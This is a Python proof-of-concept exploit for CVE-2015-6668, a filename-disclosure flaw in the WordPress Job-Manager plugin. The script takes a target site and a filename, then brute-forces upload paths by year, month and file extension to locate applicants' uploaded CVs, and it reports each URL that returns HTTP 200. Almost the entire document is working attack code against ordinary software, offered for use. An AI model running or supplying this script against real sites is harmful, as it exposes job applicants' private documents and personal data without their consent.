# The most difficult thing of this structure is the filename. Only the filename can't be bruteforced. Since we have that knowledge we can bruteforce the year and month and finally find the uploaded file. In this case, it is the CV.
#
# Simple POC code(wordpress replaces the space(%20) with a '-') in the filenames of the uploaded CVs)#
#
# The most common file extensions for CVs are pdf, doc, docx.

import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2017,2018):  
    for i in range(1,13):
        for extension in {'doc','pdf','docx', 'php','html','pdf','png','gif','jpg','jpeg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL